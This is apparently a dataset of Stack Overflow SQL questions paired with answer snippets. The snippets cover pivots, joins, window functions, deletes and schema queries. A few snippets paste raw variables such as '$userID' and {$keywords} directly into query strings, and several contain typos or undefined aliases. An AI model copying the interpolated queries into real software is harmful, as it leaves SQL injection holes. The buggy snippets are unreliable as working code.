GROUP BY table.date
"
31265,26161,MySQL: Group colums without colum with null,"SELECT `tblproducts`.`id` AS `productid`,
       max(IF(`tblproductconfigoptionssub`.`optionname` = '1', `tblpricing`.`monthly`, NULL)) AS `priceforoneyear`,
       max(IF(`tblproductconfigoptionssub`.`optionname` = '2', ROUND(`tblpricing`.`monthly` / 2, 2), NULL)) AS `pricefortwoyears`,
       max(IF(`tblproductconfigoptionssub`.`optionname` = '3', ROUND(`tblpricing`.`monthly` / 3, 2), NULL)) AS `priceforthreeyears`,
       max(IF(`tblproductconfigoptionssub`.`optionname` = '4', ROUND(`tblpricing`.`monthly` / 4, 2), NULL)) AS `priceforfouryears`,
       max(IF(`tblproductconfigoptionssub`.`optionname` = '5', ROUND(`tblpricing`.`monthly` / 5, 2), NULL)) AS `priceforfiveyears`
FROM `tblproducts` INNER JOIN
     `tblproductconfigoptionssub`
     ON `tblproducts`.`id` = `tblproductconfigoptionssub`.`configid` INNER JOIN
     `tblpricing`
     ON `tblproductconfigoptionssub`.`id` = `tblpricing`.`relid`
WHERE `tblproducts`.`gid` = '1' AND `tblpricing`.`type` = 'configoptions'
GROUP BY `tblproducts`.`id`; 
"
12509,26645,"SQL - union two tables, each having a few unique columns","declare
 @tableName1 sysname = 'myfirsttablename'
,@tableName2 sysname = 'mysecondtablename'
,@select varchar(max) = 'select';

declare @columns table
(
     Id int identity(1,1)
    ,ColumName nvarchar(128)
    ,ExistsInTable1 bit
    ,ExistsInTable2 bit
);

-- Get a column listing with flags for their existence in each table
insert @columns
select distinct
 quotename(c.Column_Name)
,iif(c2.Table_Name is null, 0, 1)
,iif(c3.Table_Name is null, 0, 1)
from Information_Schema.Columns as c
    left join Information_Schema.Columns as c2
    on c2.Column_Name = c.Column_Name
    and c2.Table_Name = @tableName1
    left join Information_Schema.Columns as c3
    on c3.Column_Name = c.Column_Name
    and c3.Table_Name = @tableName2 
where c.Table_Name in (@tableName1, @tableName2);

-- Build the select statement for the 1sttable (using null where the column is absent)
select
 @select += char(10) + iif(c.Id = 1, ' ', ',') 
+ iif(c.ExistsInTable1 = 1, c.ColumName, 'null') + ' as ' + c.ColumName
from @columns as c
order by c.Id;

set @select += '
from ' + quotename(@tableName1) + '
union all
select';

-- Build the select statement for the 2ndtable (using null where the column is absent)
select
 @select += char(10) + iif(c.Id = 1, ' ', ',') 
+ iif(c.ExistsInTable2 = 1, c.ColumName, 'null') + ' as ' + c.ColumName
from @columns as c
order by c.Id;

set @select += '
from ' + quotename(@tableName2);

-- Print or execute your sql.
print(@select); -- or exec(@select);
"
4201,57496,SUbstiute for SubQuery to delete records from table,"Delete t1 
from table_1 t1
left join table_2 t2 on t1.id = t2.id
where t2.id is null
"
10797,71716,Converting a boolean field to 'yes' or 'no' statement on select,"select iif(bool_field_name, 'yes', 'no')
"
14103,42904,How to find duplicates within a group - SQL 2008,"SELECT Order_No, Category, Type, 
  CASE WHEN COUNT(CASE WHEN Type='Main Unit' THEN 1 ELSE NULL END) 
            OVER (PARTITION BY Category) > 1 
       THEN 'More than one Main Units' ELSE '' END Warning
FROM MyTable
"
23447,44922,"SQL Server 2005 Syntax Help - ""Select Info based upon Max Value of Sub Query""","Select A.*, B.*, C.JobID, C.Value
from 
Invoice as A
inner join Customer as B on A.CustomerID = B.CustomerID
inner join (
   select JobID, Value, CustomerID,
   ROW_NUMBER() OVER (PARTITION BY CustomerID ORDER BY Value DESC) AS Ordinal
   from Jobs
   WHERE Year = 2008
) AS C ON (A.CustomerID = C.customerID AND C.Ordinal = 1)
"
7978,54820,`MySQL GROUP BY is slower when using index,"CREATE INDEX timeword_idx ON demo(time, word, count);
"
22647,33109,HSQLDB ROWNUM compatibility with Oracle,"SET DATABASE SQL SYNTAX ORA TRUE
"
17516,22250,"Cassandra Time-Series: Allow Filtering, Buckets, or Other","CREATE TABLE search_terms_by_day_of_year (
  day_searched int, // 1 - 366
  datetime_searched timestamp,
  term_used text,
  product_found text,
  PRIMARY KEY (day_searched, datetime_searched, term_used, product_found)
);

// Make N of these, with a different day_searched
SELECT term_used, product_found
FROM search_terms_by_week
WHERE day_searched = 51
AND datetime_searched > [start]
AND datetime_searched < [end]
"
16624,32124,Find duplicate rows in SQL with column type having text,"select *
from rp_tblstudydetails sd
where exists
(
  select *
  from rp_tblstudydetails newer
  where newer.studysysid = sd.studysysid
  and newer.contenttext = sd.contenttext
  and newer.createdon > sd.createdon
);
"
21930,29258,sum(coalesce()) returns 1 less then true value,"select sum(CASE WHEN thomeid='2013T1' THEN hpoints ELSE apoints END) Points
from plays_a
where (tawayid='2013T1' or thomeid='2013T1')
"
35892,2136,SQL Server Create VIEW for Sorting,"CREATE VIEW [dbo].[V_MY_VIEW] AS 

SELECT a.DOC_ID, a1.VALUE AS A, a2.VALUE AS B, a3.VALUE AS C 
FROM dbo.TABLE_A a
LEFT JOIN (SELECT DOC_ID, VALUE FROM dbo.TABLE_B WHERE NAME = 'A') a1 
    ON a.DOC_ID = a1.DOC_ID
LEFT OUTER JOIN  ( SELECT DOC_ID, VALUE FROM dbo.TABLE_B WHERE NAME = 'B') a2 
    ON a.DOC_ID = a2.DOC_ID 
LEFT OUTER JOIN ( SELECT DOC_ID, VALUE FROM dbo.TABLE_B WHERE NAME = 'C') a3 
    ON a.DOC_ID = a3.DOC_ID 
WHERE a.STATUS IN (0, 1)
"
29834,23456,SELECT with timestamp dynamic returning results from the same table,"SELECT i.id, i.timestamp, i.code, i2.code, i2.timestamp 
FROM table i LEFT JOIN (
     table i2
     ON i.id != '0' and
         i2.timestamp BETWEEN i1.timestamp - interval '7 days' and i1.timestamp - interval '1 day'
WHERE i.timestamp BETWEEN '2013-01-08' AND '2013-01-08';
"
33355,34678,How can we show records even if id is null?,"SELECT g.*
     , r.rol_display_name
     , u.usr_fname 
FROM  groups g
JOIN groups_roles gr on g.id = gr.groups_id
JOIN roles r on r.id = gr.roles_id
LEFT JOIN users u on g.grp_manager_id = u.id   
"
1881,71463,Can I combine my two SQLite SELECT statements into one?,"select substr(date, 0,7) ""Month"",
       total(case when a > 0 then a else 0 end) ""Income"",
       total(case when a < 0 then a else 0 end) ""Expenses""
from posts
group by month
"
6191,1947,Oracle: how to add a text node into an existing element,"update t
set xml = updateXML(xml, '/a/b', XMLType('<b>gaga</b>'))
"
9443,23640,Find out the date a cumulative sum value is reached,"SELECT reservation_property_id, MIN(reservation_date) 
FROM (SELECT IF(@prevProperty != q.reservation_property_id, 
                @runningtotal:=0, 
                @runningtotal:=@runningtotal + payment_amount) AS runningtotal,
             @prevProperty := q.reservation_property_id, q.*
      FROM (SELECT *
            FROM reservations r 
            INNER JOIN payments p 
                    ON p.payment_reservation_id = r.reservation_id 
                    /*not sure how your tables are linked*/
            , (SELECT @runningtotal:=0, @prevProperty:=0) vars
            ORDER BY r.reservation_property_id, reservation_date) q
      ) sq
WHERE runningtotal >= 500
GROUP BY reservation_property_id
"
3941,71599,How build a SELECT statement with dates disconsidering time?,"SELECT * 
FROM MyTable 
WHERE cast(floor(cast(MyDate as float))+1 as datetime) > getdate()
"
15191,8589,Intensive Writing Rolling Window Postgresql Database,"import psycopg2
from datetime import datetime
from psycopg2.extensions import AsIs

conn = psycopg2.connect(""host=localhost4 port=5432 dbname=cpn"")
cursor = conn.cursor()

insert_query = """"""
    insert into %(child)s (id, value, ""timestamp"")
    values
    (%(id)s, %(value)s, %(timestamp)s)
""""""
timestamp = datetime(2014, 1, 1, 0, 0, 0)
insert_dict = {
    'child': AsIs('meas_' + str(timestamp.isoweekday())),
    'id': 1,
    'value': 1,
    'timestamp': timestamp
}

cursor.execute(insert_query, insert_dict)
conn.commit()
"
7249,13342,SQL - How do I create a SELECT with formatted name,"select id,
       case
         when is_company then companyName
         else lastname||', '||firstname
       end as name
from my_table
"
38265,15765,oracle query sequential summation per rows,"SELECT *,
    SUM(Input + Output) OVER(PARTITION BY ID ORDER BY Date) AS Total
FROM table_a
"
5670,24590,"Comparing 2 columns in the same table with the ""Like"" function","SELECT NodeName, DNS
WHERE DNS NOT LIKE NodeName + '%' AND DNS NOT LIKE '%' + NodeName + '%'
"
35386,58378,Using table variable for iteration?,"declare @alertId table (ID int primary key clustered, alerts int);

-- throw some Ids into @alertId here

declare @id int = -1; -- make sure this is less than any valid alert ID

while 1=1  
begin
    select top(1) @id = ID 
    from @alertId 
    where ID > @id 
    order by ID asc;

    if @id is null break; -- we're done

    -- do whatever needs to be done with @id
    print @id
end
"
15007,362,Getting 'root records' from self-referencing table,"declare @TableA table
(
  ID int,
  ParentID int NULL,
  Name varchar(100)
)

insert into @TableA(ID, ParentID, Name)
values
(1, NULL, 'root 1'),
(2, NULL, 'root 2'),
(3, 2, 'node 3->2'),
(4, 1, 'node 4->1'),
(5, 4, 'node 5->4->1'),
(6, 3, 'node 6->3->2'),
(7, 4, 'node 7->4->1'),
(8, 7, 'node 8->7->4->1')


;with QueryA as 
(
  /* your query could be here */
  select t.ID, t.Name
  from @TableA t
  where t.ID in (1, 3, 8)
),
Tree as
(
  select t.ID, t.ParentID, t.Name,
    case when t.ParentID is NULL then t.ID end as RootID
  from @TableA t
  /* starting from rows we have in QueryA */
  where t.ID in (select q.ID from QueryA q)

  union all

  select tt.ID, t.ParentID, t.Name,
    case when t.ParentID is NULL then t.ID end as RootID
  from @TableA t
  /* recursion to parents */
  inner join Tree tt on tt.ParentID = t.ID
)
select q.ID, q.Name, t.Name as RootName
from QueryA q
inner join Tree t on t.ID = q.ID and t.RootID is not NULL
order by 1, 2
"
6675,66410,Merging Many to Many Results,"SELECT 
    id,
    MAX( CASE WHEN name = 'flavor' THEN value ELSE NULL END ) AS flavor,
    MAX( CASE WHEN name = 'type' THEN value ELSE NULL END ) AS type
FROM prefix_site_tmplvars
    LEFT JOIN prefix_site_tmplvar_contentvalues 
    ON prefix_site_tmplvar_contentvalues.tmplvarid = prefix_site_tmplvars.id
    LEFT JOIN prefix_site_content
    ON prefix_site_tmplvar_contentvalues.contentid = prefix_site_content.id
WHERE prefix_site_tmplvar_contentvalues.value = ""chocolate""
GROUP BY id
"
12937,16058,Convert multiple IF EXIST statments to something more readable,"DECLARE @doesXExist BIT = CASE WHEN EXISTS(...) THEN 1 ELSE 0 END
"
25740,33357,how to round up to decimal place like money,"CEILING(moneyvalue * 100) / 100
"
16388,50790,sql join two tables with same header,"INSERT INTO table1
SELECT * FROM table2
"
8845,39011,Is checking the UserId before retrieving and committing changes to SQL with EF secure enough?,"interface IMyEntityDbContext {
    Entity GetEntity(int id, int userId);
    int Insert(Entity entity);
    void Delete(int id, int userId);

    void Update(Entity entity);
    //or if possible in EF
    void Update(Entity entity, int userId);
}
"
5001,29986,LIKE clause is not working in SQL server,"SELECT DocId, NSN, Qty, RequestDate, ReceiveDate
FROM Orders
WHERE (DocID LIKE '%DSRB%') OR (DocID LIKE '%DHA%')
"
9885,21444,First DB - How to structure required information,"BEGIN;
CREATE TABLE ""country"" (
    ""id"" integer NOT NULL PRIMARY KEY,
    ""name"" varchar(255) NOT NULL
)
;
CREATE TABLE ""location"" (
    ""id"" integer NOT NULL PRIMARY KEY,
    ""name"" varchar(255) NOT NULL,
    ""coordinate"" varchar(255) NOT NULL,
    ""country_id"" integer NOT NULL REFERENCES ""country"" (""id"")
)
;
CREATE TABLE ""item"" (
    ""id"" integer NOT NULL PRIMARY KEY,
    ""title"" varchar(25) NOT NULL,
    ""description"" text NOT NULL,
    ""date"" datetime NOT NULL,
    ""source"" varchar(255) NOT NULL,
    ""link"" varchar(255) NOT NULL,
    ""location_id"" integer NOT NULL REFERENCES ""location"" (""id"")
)
;
"
39738,58758,Convert a row with two columns into two rows of one column,"(SELECT confid1 as id1, conformer.pdbcode 
from dyndomrun JOIN conformer 
           ON dyndomrun.confid1 = conformer.id)
UNION
(SELECT confid2 as id2, conformer.pdbcode 
 from dyndomrun JOIN conformer 
           ON dyndomrun.confid2 = conformer.id)
"
14877,75031,INSERT statement conflicted with the CHECK constraint,"cast( cast( employeeNumber as int ) as char(8) ) = employeeNumber 
AND cast(employeeNumber as int) > 10000000
AND charindex('0', employeeNumber) = 0
"
22743,21584,"How to format time to '2:34 hrs', '0:34 hrs' etc in MySQL","SELECT operator_no, log_in_time,
       TIME_FORMAT(
           TIMEDIFF(log_in_time, log_out_time),
           '%H:%i hrs'
       ) AS Duration
"
8749,28681,Split words in many columns sql,"select
    regexp_substr(""Column-desc"", '\S+', 1, 1) as ""return-desc1"",
    regexp_substr(""Column-desc"", '\S+', 1, 2) as ""return-desc2"",
    regexp_substr(""Column-desc"", '\S+', 1, 3) as ""return-desc3"",
    regexp_substr(""Column-desc"", '\S+', 1, 4) as ""return-desc4""
from your_table
"
15950,4244,Empty composite field based on 3 columns when 1 column is empty,"CASE 
   WHEN adres.CD_land = 'NL' THEN street 
   ELSE upper(COALESCE(postalcode + ' ', '') + street) 
END as Street
"
36408,42553,MySQL query advice,"SELECT id, song_id, COUNT(1) AS total
FROM votes
WHERE created BETWEEN [user_defined_start_date] AND [user_defined_end_date]
GROUP BY song_id
ORDER BY total DESC 
LIMIT 10;
"
861,70271,sql pivot table or something like a pivot table,"select personID,[Foo],[Bar],[fooBar]
FROM (
        SELECT pp.PersonID,phonetype,phoneNumber 
        FROM personToPhone AS PP
        inner join phone as p on pp.phoneid = p.phoneid
        where pp.personid = @PersonID) as tableToPivot
pivot (max(phoneNumber) for phoneType IN ([[Foo],[Bar],[fooBar])) as pivotTable
"
27248,56820,count duplicate values in a column sql,"SELECT Count(Column) - Count(DISTINCT Column)
FROM   yourTable
"
21979,47036,Inserting columns with a case statement,"SELECT class,
       MAX(CASE
             WHEN ( community_id = 'Math' ) THEN 'Y'
             ELSE 'N'
           END)  AS Math,
       MAX (CASE
              WHEN ( community_id = 'tech' ) THEN 'Y'
              ELSE 'N'
            END) AS tech,
       MAX (CASE
              WHEN ( community_id = 'english' ) THEN 'Y'
              ELSE 'N'
            END) AS english
FROM   x_class_community
GROUP  BY class 
"
28563,42641,MySQL - conditional SELECT,"select  *
from    (
        select  s2.store_id
        from    store s2
        join    items i2
        on      s2.store_id = i2.store_id
        group by
                s2.store_id
        having 
                count(*) > 1 -- More than one item
                or max(i2.status) = 'unsold' -- One item but unsold
        ) filter
join    store s
on      filter.store_id = s.store_id
join    items i
on      s.store_id = i.store_id
"
27738,69945,Select records fillin a field on a block (Oracle Forms),"GO_BLOCK('MYTABLE');
EXECUTE_QUERY;
"
10138,11513,Select periods from SQL Server,"select min(dt), max(dt)
from (select dt,
             (dt - row_number() over (order by dt) ) as grp
      from table t
      where flag = true
     ) t
group by grp;
"
1391,45689,What does Oracle call a SID?,"select sys_context('userenv', 'instance_name') from dual
"
17820,36378,Add a row total to a view,"select c.companyID, c.CompanyName, i.IncomeType, i.Jan, i.Feb, i.Mar,
       (i.Ja + i.Feb + i.Mar) as Total
from company c join
     income i
     on c.companyid = i.companyid;
"
25875,20555,Comparing two records from different tables and deleting those that match,"strSQL_count = ""SELECT COUNT(email) AS 'count' FROM emails INNER JOIN CustRecords ON CustRecords.Email = emails.email""
Set rs = conn.Execute(strSQL_count)

count = rs(""count"")

strSQL = ""DELETE emails FROM emails INNER JOIN CustRecords ON CustRecords.Email = emails.email""
Set rs = conn.Execute(strSQL)
"
35322,26436,Microsoft SQL with more than one distinct COUNT and WHERE clause,"select id1, month,
       count(distinct case when quantA is not null then id2 end) as var1,
       count(distinct case when quantB is not null then id2 end) as var2
from t
group by id1, month
"
33743,7017,Stored procedure to return user permissions,"CREATE PROCEDURE Get_User_Permissions
@UserName VARCHAR(100)
AS
BEGIN
  SET NOCOUNT ON;

    SELECT   pc.name            AS [User Name]
            ,pc.type_desc       AS [User Type]
            ,pm.permission_name AS [Permission Name]
            ,pm.state_desc      AS [Permission Status]
            ,pm.class_desc      AS [Object Type]
            ,object_name(pm.major_id) AS [object_Name]
    FROM sys.database_principals pc
    LEFT JOIN  sys.database_permissions pm
    ON pm.grantee_principal_id = pc.principal_id
    WHERE pr.name = @UserName
END
"
13870,50337,Extract first number value from string sql,"select left(s, patindex('%[^0-9]%', s) - 1)
from (select substring(col, patindex('%[0-9]%', col), len(col)) as s
      from t
     ) t;
"
3327,30547,Find records which cross-reference each other,"SELECT DISTINCT a.*
FROM mytable a
JOIN mytable b
  ON a.ref1 = b.ref2 AND a.ref2 = b.ref1;
"
22979,67653,Substring with delimiter in SQL,"select substring('Abilene, TX',charindex(',','Abilene, TX')+2,2)
"
30894,910,select and set column value,"SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;
"
22775,65459,Applying LAG() to multiple rows with a null value,"with q as (
      select m.ID, PERIOD_START, PERIOD_END, a.AUDIT_TIME, STATUS
      from m LEFT OUTER JOIN
           a
           on m.id = a.id and
              a.audit_time between m.period_start and m.period_end
     )
select q.*,
       max(status) over (partition by id, audit_grp) as imputed_status
from (select q.*,
             max(audit_time) over (partition by id order by period_start) as audit_grp
      from q
     ) q
"
28700,26058,Insert one row for each key,"INSERT INTO lngnottranslated (lngid,engDef) SELECT lngid, 'Welcome' FROM lnglngdef;
"
22484,35982,mysql max(date) not working,"SELECT  *
FROM    History
WHERE   symbol = $symbol AND
        date = (SELECT MAX(date) FROM History)
"
17304,45027,What is the prefered way to query multiple tables in android,"select module_title, module_credit from modules m, module_tutor mt 
where mt.module_id=m.id and mt.tutori_id=?
"
15598,6272,Update status in table with specific email,"UPDATE `tablename`
SET `Status` = 'True'
WHERE `emailAddress` LIKE '%@gmail.com';
"
24241,23930,SQL - How to work with columns mapping to different data?,"SELECT T2.data as var_name, T1.data as val_name
FROM one O
INNER JOIN two T1
    ON O.var = T1.s
INNER JOIN two T2
    ON O.val = T2.s
"
8991,44932,How to query column names dynamically using Postgres/NpgSQL,"SELECT column_name
FROM information_schema.columns
WHERE table_schema='public' AND table_name='yourtablename'
"
22077,72286,sp_MSforeachtable to execute procedure on each table,"PRINT ''DROPCONSTANT @TBLNAME=''''''+PARSENAME(""?"",1)+'''''', @FLDNAME=''''EMAIL_S'''' ''
"
14906,11172,Possible to use SQL to sort by date but put null dates at the back of the results set?,"SELECT * FROM myTable
WHERE ...
ORDER BY CASE WHEN myDate IS NULL THEN 1 ELSE 0 END, myDate;
"
10983,36547,alter stored procedure to use snapshot isolation level,"USE [myDB]
GO
SET ANSI_NULLS OFF
GO
SET QUOTED_IDENTIFIER OFF
GO
ALTER PROCEDURE [dbo].[myStoredProcedure]

AS
BEGIN
    SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED

    SELECT *
    FROM someTable
END
"
28254,9891,"MySQL ""Group By"" and ""Order By""","SELECT * FROM ( 
    SELECT emailID, fromEmail, subject, timestamp, MIN(read) as read 
    FROM incomingEmails 
    WHERE toUserID = '$userID' 
    ORDER BY timestamp DESC
) AS tmp_table GROUP BY LOWER(fromEmail)
"
26438,58477,Select rows with different value in same filed,"SELECT *
FROM `property`
WHERE `user_id` =60
AND `approved` =1
AND (`title` like '%one%' OR `title` like '%two%')
"
23317,72890,How to do one big select from table in MySQL?,"SELECT 
  DATE(dateCreated) as ""Date"", 
  count(dateCreated) as ""No of Entries"",
  99845 as Total,
  sum( case when premium='Y' then 1 else 0 end ) as Premium,
  sum( case when premium='N' then 1 else 0 end ) as Free,
  sum( case when affiliateID IS NOT NULL then 1 else 0 end) as Affiliate

 FROM MyTable
 GROUP BY DATE(dateCreated)
 ORDER BY Date ASC
"
23549,75271,Add nonexistent ID to database,"INSERT INTO table
(id, another_column, ... )
VALUES
(1, 'some value', ... );
"
2444,13093,Deleting non matching records from a table prior to linking,"DELETE FROM LandingDetails WHERE LandingId NOT IN (SELECT LandingId FROM LandingHeaders)
"
25446,38954,Count min and max from a field,"SELECT name, min(nCount) cMin, max(nCount) cMax
FROM (Select 
          uc.name,
          p.date, 
          count(p) as nCount
      From table1 p, table2 uc
      Where uc.id = p.uc_id
      and   p = 1 
      group by uc.name, p.date) nameCount
GROUP BY name
"
38707,10537,Linq to SQL Filter Matches,"var query = (from solvedPuzzle in db.SolvedPuzzles
              where solvedPuzzle.UserID == user.ID
              order by NumberOfMoves ascending
              group solvedPuzzle by solvedPuzzle.PuzzleID into filtered
              select filtered.First());
"
725,46092,How to pick columns of table dynamically which are free?,"UPDATE  tableName
SET     ColA = CASE WHEN ColA IS NULL THEN 'NewValue' ELSE ColA END,
        ColB = CASE WHEN ColA NOT NULL AND ColB IS NULL THEN 'NewValue' ELSE ColB END,
        ColC = CASE WHEN ColA NOT NULL AND ColB NOT NULL AND ColC IS NULL THEN 'NewValue' ELSE ColC END
WHERE   ID = 1
"
13937,36538,Merging tables with duplicate data,"select a.id, b.id, ISNULL(a.fid,b.fid) fid, ISNULL(a.type,b.type) type
from
    (select *, ROW_NUMBER() over (partition by type order by id) rn from a ) a
        full outer join
    (select *, ROW_NUMBER() over (partition by type order by id) rn from b ) b
        on a.rn=b.rn
        and a.type = b.type
order by a.id       
"
39295,26900,How to create a query with phpMoAdmin?,"array('name' => 'Smith')
"
10505,14122,select the latest date from joins,"SELECT T2.TempEmailID, T1.EmailID
FROM tbl1 T1
LEFT JOIN (SELECT *, RANK() Over (Partition By EmailID Order By TempEmailID DESC) as TopOne FROM tbl2) T2 ON T1.EmailID = T2.EmailID AND TopOne = 1
"
14118,37730,Apply certain condition on specific rows in SQL statement,"SELECT name 
  FROM mytable
 WHERE mydate BETWEEN  '2011-01-01' AND '2011-04-01'
   AND ADDTIME(mydate, endtime) > NOW()
"
17264,41582,how to match values in sql ?,"with fact
as(
select Id,digit1,digit2,digit3,digit1*digit2*digit3 as [mult],digit1+digit2+digit3 as [sum]
from Data),part as(
  select Id,digit1,digit2,digit3,[mult],[sum],row_number() over(partition by [mult],[sum] order by [mult],[sum]) as [Part]
  from fact
  )
select Id,digit1,digit2,digit3,(select count(*) 
                                 from fact f where f.[mult]=p.[mult] and f.[sum]=p.[sum]) as amount
from part p
where part=1
"
4260,42596,sql make the joined tables as one table may be?,"SELECT 
  *
FROM Table3 t3
JOIN  (SELECT
        *
       FROM `Databse1`.`table1`
       JOIN `Database2`.`table2` ON `table2`.`customerID` = `table1`.`customerID`
       WHERE
       `table1`.`recordID` IN (1,2,3,4)) t1 ON t1.customerID = t3.customerID
WHERE t3.customerID = [your customer id]
"
36133,73067,Replace CHAR with VARCHAR2,"select 'ALTER TABLE ""' || owner || '"".""' || table_name
|| '"" MODIFY (""' || column_name
|| '"" VARCHAR2(' || data_length || '));'
from all_tab_columns tc
where data_type = 'CHAR'
and owner = :schemaname
and exists (
    select 1
    from all_tables t
    where tc.owner = t.owner
    and tc.table_name = t.table_name
);
"
28605,4782,Assign Same SNo to Parent and its Child,"SELECT *, DENSE_RANK() OVER (ORDER BY CASE WHEN ParentID = 0 THEN ID ELSE ParentID END) 
FROM TmpTable
ORDER BY Id
"
29670,70545,get related row in many to many relation once,"SELECT DISTINCT A.*
FROM A
    INNER JOIN B
        ON A.id = B.id
    INNER JOIN C
        ON C.id = B.id
WHERE C.SomeField = 'SomeValue'
"
27709,19188,SQL - How to get the Unique Key's Column Name from Table,"SELECT *
FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS TC
WHERE TC.TABLE_NAME = 'MYTABLENAME'
AND TC.CONSTRAINT_TYPE = 'UNIQUE'
"
39193,56852,SQL query to produce XML result,"SELECT XMLElement(""Country"" 
  , XMLAgg(
    XMLElement(""CountryInfo""
      ,XMLFOREST(CTRY.NAME ""name"", ctry.DISTRICTS ""districts"") 
      , xmlAgg(
        XMLElement(""state"",XMLFOREST(st.ST_NAME ""stateName"", st.ST_POPULATION  ""statePop"") 
        ) 
      ) 
    ) 
  ) 
)
FROM COUNTRY ctry
INNER JOIN STATES st
ON (ctry.NAME=st.COUNTRY)
GROUP BY CTRY.NAME ,ctry.DISTRICTS
"
27760,1088,Find free adjacent timeslot in postgres,"select ts1.timeslot_id as start_timeslot_id, 
    coalesce(t4.timeslot_id, t3.timeslot_id, t2.timeslot_id, t1.timeslot_id) as end_timeslot_id, 
    coalesce(t4.end_hour, t3.end_hour, t2.end_hour, t1.end_hour)*60+coalesce(t4.end_minute, t3.end_minute, t2.end_minute, t1.end_minute) - t1.start_hour*60+t1.start_minute as duration_minutes
from timeslot ts1
left join timeslot ts2 
on ts1.timeslot_id+1 = ts2.timeslot_id
and t12.available_status_id = 1 
left join timeslot ts3 
on ts2.timeslot_id+1 = ts3.timeslot_id
and ts3.available_status_id = 1 
left join timeslot ts4 
on ts3.timeslot_id+1 = ts4.timeslot_id
and ts4.available_status_id = 1 
where ts1.start_year = '2013' -- these all are your input parameters
and ts1.start_month = '09'
and ts1.start_day = '09'
and employee_id = 5
and coalesce(t4.end_hour, t3.end_hour, t2.end_hour, t1.end_hour)*60+coalesce(t4.end_minute, t3.end_minute, t2.end_minute, t1.end_minute) - t1.start_hour*60+t1.start_minute >= 60 -- duration in minutes
"
16359,11822,How can I efficiently transfer data from a vertical databaselayout to a horizontal one,"with t as
(
select 1 as ID, 10 as type, 111 as Value from dual
union
select 1, 14, 222 from dual
union
select 2, 10, 333 from dual
union
select 2, 25, 444 from dual
)
select ID,
max(case when type = 10 then Value else null end) as Type10,
max(case when type = 14 then Value else null end) as Type14,
max(case when type = 25 then Value else null end) as Type25
from t
group by id
"
19675,46645,SQL Replication Error (On Server Agent),"1 - Job username and Job password must have full access and permission of windows.
2 - You must be logged In to user that you will use in the replication script to create replication.
"
28422,12167,How to renumber primary index,"SET @i=0;
UPDATE table_name SET column_name=(@i:=@i+1);
"
23754,20787,SQL Server Database ODBC User List,"SELECT 
   name, principal_id, default_schema_name, create_date  -- more columns available
FROM sys.database_principals
WHERE type = 'S'  -- SQL Server users
   OR type = 'W'  -- Windows users
"
12444,56236,Get highest/lowest value from many-to-many,"SELECT 
    MIN(Product.Price) AS 'Lowest price', 
    MAX(Product.Price) AS 'Highest price', 
    Category.Name AS CategoryName
FROM Product_Category 
    JOIN Product ON Product_Category.ProductID = Product.ID 
    JOIN Category ON Product_Category.CategoryID = Category.ID
GROUP BY Category.Name
"
6320,32183,TSQL to get XML data into a column,"DECLARE @x XML;
SET @x = N'<?xml version = ""1.0""?>
<EVENT_INSTANCE>
  <EventType>ALTER_TABLE</EventType>
  <PostTime>2015-05-19T14:01:46.930</PostTime>
  <SPID>52</SPID>
  <ServerName>computer1</ServerName>
  <LoginName>domain\user</LoginName>
  <UserName>dbo</UserName>
  <DatabaseName>DBA</DatabaseName>
  <SchemaName>dbo</SchemaName>
  <ObjectName>Table_1</ObjectName>
  <ObjectType>TABLE</ObjectType>
  <AlterTableActionList>
    <Create>
      <Columns>
        <Name>c8</Name>
      </Columns>
    </Create>
  </AlterTableActionList>
  <TSQLCommand>
    <SetOptions ANSI_NULLS=""ON"" ANSI_NULL_DEFAULT=""ON"" ANSI_PADDING=""ON"" QUOTED_IDENTIFIER=""ON"" ENCRYPTED=""FALSE"" />
    <CommandText>ALTER TABLE dbo.Table_1 ADD c8 INT NULL</CommandText>
  </TSQLCommand>
</EVENT_INSTANCE>';


SELECT REPLACE(REPLACE(CONVERT(VARCHAR(1000), @X.query('(//TSQLCommand/SetOptions)')),'<SetOptions', ''), '/>', '')
"
15480,42329,SQLite: Retrieve single representative entity for each group of entities,"SELECT * FROM gasstations
GROUP BY city
"
35816,48319,Multiply every entry in column by a fixed number in SQL,"UPDATE table SET age=age*2
"
23321,26941,WHERE clause after UNION ALL,"SELECT * 
FROM
(
  SELECT a.username, MATCH(a.highlight) AGAINST (\""{$keywords}\"" IN BOOLEAN MODE) AS score 
  FROM resume_highlights a
  JOIN seekers ON a.username = seekers.username and seekers.resume_status = 1
  HAVING score>0 

    UNION ALL

  SELECT b.username, MATCH(b.skill,b.skill_list) AGAINST (\""{$keywords}\"" IN BOOLEAN MODE) AS score 
  FROM resume_skills b
  JOIN seekers ON b.username = seekers.username and seekers.resume_status = 1
  HAVING score >0 

    UNION ALL

  SELECT c.username, MATCH(c.education_title,c.education_organization) AGAINST (\""{$keywords}\"" IN BOOLEAN MODE) AS score 
  FROM resume_education c
  JOIN seekers ON c.username = seekers.username and seekers.resume_status = 1
  HAVING score >0 

    UNION ALL

  SELECT d.username, MATCH(d.employer_title,d.employer_organization) AGAINST (\""{$keywords}\"" IN BOOLEAN MODE) AS score 
  FROM resume_employer d
  JOIN seekers ON d.username = seekers.username and seekers.resume_status = 1
  HAVING score>0 

    UNION ALL

  SELECT e.username, MATCH(e.volunteer_title,e.volunteer_organization) AGAINST (\""{$keywords}\"" IN BOOLEAN MODE) AS score 
  FROM resume_volunteer e
  JOIN seekers ON e.username = seekers.username and seekers.resume_status = 1
  HAVING score >0 

) AS X
ORDER BY SCORE desc
"
18754,54287,Subquery in ON clause Laravel ORM,"SELECT * FROM buildings
JOIN (
      SELECT a.building_id, b.level 
      FROM ingame_buildings as a
      JOIN buildings as b ON a.building_id=b.id
     ) 
AS ingame_level ON ingame_level.building_id=buildings.id
WHERE buildings.level > ingame_level.level
"
29859,15026,Foreign Keys - What do they do for me?,"SELECT p.*
   FROM PROJECTS p
   JOIN USERS u ON u.user_id = p.creator
WHERE u.username = 'John Smith'
"
29114,46875,"Can MySQL / SQL's short hand of ""Using"" be used without saying ""Inner Join""?","join_table:
    table_reference [INNER | CROSS] JOIN table_factor [join_condition]
  | table_reference STRAIGHT_JOIN table_factor
  | table_reference STRAIGHT_JOIN table_factor ON conditional_expr
  | table_reference {LEFT|RIGHT} [OUTER] JOIN table_reference join_condition
  | table_reference NATURAL [{LEFT|RIGHT} [OUTER]] JOIN table_factor

join_condition:
    ON conditional_expr
  | USING (column_list)
"
806,23919,SSRS Date column sorting,"CAST(yourDateString AS DATE)
"
